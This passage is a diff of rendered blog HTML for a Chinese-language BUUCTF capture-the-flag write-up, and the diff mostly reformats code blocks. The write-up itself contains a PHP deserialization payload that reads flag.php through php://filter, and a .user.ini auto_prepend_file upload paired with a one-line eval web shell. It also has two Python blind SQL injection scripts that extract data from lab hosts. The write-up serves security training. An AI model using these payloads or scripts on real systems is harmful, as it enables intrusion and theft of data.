 <p>O:11:”FileHandler”:3:{S:5:”\00*\00op”;i:2;S:11:”\00*\00filename”;S:8:”flag.php”;S:10:”\00*\00content”;N;}<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405163823-cbcdc163-65d7-4347-8927-e312baf2fd5b.png" alt="img"></p>
 <h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>php7.1+的版本对属性类型不敏感，本地序列化的时候将protected属性改为public进行绕过。</p>
 <p>对于php版本可以在响应头中看到：</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405556651-f3f966e7-2920-491b-be4e-74467bb8ad96.png" alt="img">	</p>
-<pre><code class="language-plain">&lt;?php
-class FileHandler&#123;
-    public $op=2;
-    public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
-    public $content=2;
-&#125;
-$a = new FileHandler();
-echo serialize($a);
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">    public $op=2;</span><br><span class="line">    public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">    public $content=2;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
 <p>payload：</p>
 <p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;s:7:”content”;i:2;}</p>
 <h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>最后发现image&#x2F;jpeg是能够上传的</p>
@@ -987,14 +606,12 @@ echo serialize($a);
 <p>auto_preappend_file：指定一个文件，自动包含在要执行的文件前。类似于require()函数。</p>
 <p>auto_append_file：指定一个文件，在文件后包含。</p>
 <p>这题先上传一个.usr.ini文件，内容为：</p>
-<pre><code class="language-http">GIF89A
-auto_prepend_file=a.jpg
-</code></pre>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544545603-da99bc5e-1d01-417d-a72f-7392d03d6dc3.png" alt="img"></p>
 <p>然后再上传一个a.jpg</p>
-<pre><code class="language-http">GIF89a 
-&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt;
-</code></pre>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_REQUEST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544724822-45c8d4fb-b447-48d5-ac03-38e3788a812c.png" alt="img"></p>
 <p>最后访问路径+index.php，执行命令成功执行。</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544621014-c7db06fd-8082-4a85-9e75-a271d2ed87f3.png" alt="img"></p>
@@ -1039,53 +656,7 @@ auto_prepend_file=a.jpg
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733905198815-88dbee96-527d-4434-93e7-c81e858cc81e.png" alt="img"></p>
 <p>直接上脚本。</p>
 <p>·</p>
-<pre><code class="language-plain"># 二分法
-import requests
-
-url = &quot;http://75073420-9c74-41e5-b9fb-6bfe86d0efc8.node5.buuoj.cn:81/index.php&quot;
-flag = &quot;&quot;
-i = 0
-
-while True:
-    i = i + 1
-    letf = 32
-    right = 127
-    while letf &lt; right:
-        mid = (letf+right) // 2
-        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;
-        data = &#123;&quot;id&quot;:payload&#125; 
-        res = requests.post(url=url, data=data).text
-        if &quot;Hello&quot; in res:
-            letf = mid + 1
-        else:
-            right = mid
-    if letf != 32:
-        flag += chr(letf)	
-        print(flag)
-    else:
-        break
-import requests
-
-url = &#39;http://0f594c63-4512-421d-94e3-5f261e2e70fa.node5.buuoj.cn:81/&#39;
-flag = &#39;&#39;
-for x in range(1, 50):
-    high = 137
-    low = 32
-    mid = (low + high) // 2
-    while high &gt; low:
-        payload = &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid)
-        data = &#123;
-            &quot;id&quot;: payload
-        &#125;
-        response = requests.post(url, data=data)
-        if &#39;Hello&#39; in response.text:
-            low = mid + 1
-        else:
-            high = mid
-        mid = (high + low) // 2
-    flag += chr(int(mid))
-    print(flag)
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 二分法</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://75073420-9c74-41e5-b9fb-6bfe86d0efc8.node5.buuoj.cn:81/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    letf = 32</span><br><span class="line">    right = 127</span><br><span class="line">    while letf &lt; right:</span><br><span class="line">        mid = (letf+right) // 2</span><br><span class="line">        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;</span><br><span class="line">        data = &#123;&quot;id&quot;:payload&#125; </span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        if &quot;Hello&quot; in res:</span><br><span class="line">            letf = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            right = mid</span><br><span class="line">    if letf != 32:</span><br><span class="line">        flag += chr(letf)	</span><br><span class="line">        print(flag)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://0f594c63-4512-421d-94e3-5f261e2e70fa.node5.buuoj.cn:81/&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for x in range(1, 50):</span><br><span class="line">    high = 137</span><br><span class="line">    low = 32</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload = &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in response.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (high + low) // 2</span><br><span class="line">    flag += chr(int(mid))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
 
   </div>
 </article>
@@ -1166,7 +737,7 @@ for x in range(1, 50):
     
     
     2025
-    jujub3
+    juju
   </div>
   <div class="footer-right">
     <nav>
